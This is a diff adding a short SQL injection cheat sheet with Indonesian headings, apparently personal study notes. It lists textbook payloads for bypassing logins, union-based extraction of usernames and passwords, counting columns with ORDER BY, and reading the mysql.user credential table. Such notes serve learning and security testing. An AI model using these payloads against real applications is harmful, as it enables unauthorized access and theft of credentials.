@@ -1,0 +1,31 @@
+# Bypass Login
+SELECT * FROM users WHERE username = 'INPUT' AND password = 'PASSWORD';
+	# Payload
+' OR 1=1 -- 
+' OR 'a'='a' -- 
+' OR 1=1 #
+admin' -- 
+	# Real Case
+
+
+# Mengambil Data Dari Database (Union-based Injection)
+SELECT username, password FROM users WHERE username = 'INPUT';
+	#Payload
+' UNION SELECT 1,2,3 --
+' UNION SELECT username, password FROM users --
+' UNION SELECT database(), version() --
+
+	# Mengetahui Jumlah Kolom (Order BY & Union)
+		# Jika UNION SELECT tidak langsung berhasil, kita harus tau jumlah kolomnya
+	#Payload
+' ORDER BY 1 --  ✅ (Tidak error)
+' ORDER BY 2 --  ✅ (Tidak error)
+' ORDER BY 3 --  ❌ (Error → berarti jumlah kolom = 2)
+	# Setelah tau jumlah kolomnya, gunakan NULL
+' UNION SELECT NULL, NULL -- 
+
+# Mendapatkan Passwd
+	# Payload
+' UNION SELECT username, password FROM users --
+' UNION SELECT user, password FROM mysql.user --
+
